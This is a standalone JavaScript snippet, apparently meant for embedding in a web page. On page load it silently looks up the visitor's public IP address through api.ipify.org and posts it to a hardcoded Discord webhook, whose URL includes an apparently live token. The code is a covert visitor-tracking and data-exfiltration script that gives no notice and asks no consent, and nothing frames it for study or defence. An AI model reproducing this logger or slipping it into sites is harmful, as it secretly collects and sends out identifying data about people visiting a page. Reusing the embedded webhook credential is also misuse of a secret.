window.addEventListener('load', function() {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        sendToDiscordWebhook(data.ip);
      })
      .catch(error => {
        console.error(error);
      });
  
    function sendToDiscordWebhook(ip) {
      var webhookURL = 'https://discord.com/api/webhooks/1111701362904936489/38-KdwSYeWefd2Q7hN-KmIwuxLeVklPJsuuCy0rAqIxIZp2Wy8x9QgHd6j-_a2Hxt1r-'; 
  
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: 'IP: ' + ip
        })
      })
      .then(() => console.log('IP sent to Discord webhook.'))
      .catch(error => console.error('Error sending IP to Discord webhook:', error));
    }
  });
  